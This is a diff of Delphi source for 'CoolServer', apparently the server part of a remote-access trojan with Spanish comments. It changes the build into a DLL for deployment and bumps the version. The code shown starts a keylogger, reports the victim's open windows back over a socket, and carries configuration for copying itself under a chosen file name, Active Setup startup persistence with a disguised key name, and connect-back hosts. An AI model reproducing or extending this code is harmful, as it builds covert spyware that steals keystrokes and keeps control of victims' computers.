@@ -17,8 +17,8 @@
 {$define CommDebug}
 {$define DevConfig}
 
-//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
-program CoolServer; //Para debug, más lineas "Para debug" abajo
+library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
+//program CoolServer; //Para debug, más lineas "Para debug" abajo
 uses
   Windows,
   SysUtils,
@@ -137,7 +137,7 @@ begin
   while (GetMessage(Msg, 0, 0, 0)) do
     begin
       if ThreadStarted then
-        break; //Se ha iniciado el keylogger, él se encargará de los mensajes
+        break; //Se ha iniciado el keylogger, él se encargará de recibr los mensajes
       TranslateMessage(Msg);
       DispatchMessage(Msg);
     end;
@@ -348,7 +348,6 @@ begin
                 Respuesta := GetWins(True)
               else
                 Respuesta := GetWins(False);
-
               SendText('WIND|' + Respuesta + ENTER);
             end;
 
@@ -1378,12 +1377,15 @@ begin
   end; //fin try/except block
 end; //Fin del OnRead del socket
 
+{Función llamada por el conectador, nos pasa la configuración como un puntero}
 procedure CargarServidor(P: Pointer);
 begin
   Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
   if not Configuracion.bCopiarArchivo then
     Configuracion.sCopyTo := extractfilepath(paramstr(0));
-  VersionDelServer := '1.13';
+  if VersionDelServer = '' then
+    VersionDelServer := '1.14';
+
   BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
   OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   CargarPluginsDeInicio();
@@ -1397,10 +1399,9 @@ end;
 exports CargarServidor;
 
 begin
-  //Para debug:
-  {$ifdef DevConfig}
-  OutputDebugString(PChar('CV Server Ready!'));
-  Configuracion.sHosts                 := 'localhost:77¬';
+  {
+  VersionDelServer := 'DEBUG';
+  Configuracion.sHosts                 := 'localhost:80¬';
   Configuracion.sID                     := 'Coolserver';
   Configuracion.bCopiarArchivo          := False; //Me copio o no?
   Configuracion.sFileNameToCopy         := 'coolserver.exe';
@@ -1412,7 +1413,6 @@ begin
   Configuracion.bArranqueActiveSetup    := False;
   Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
   CargarServidor(@configuracion);
-  {$endif}
-  //Fin de Para debug
+  }
 end.
 
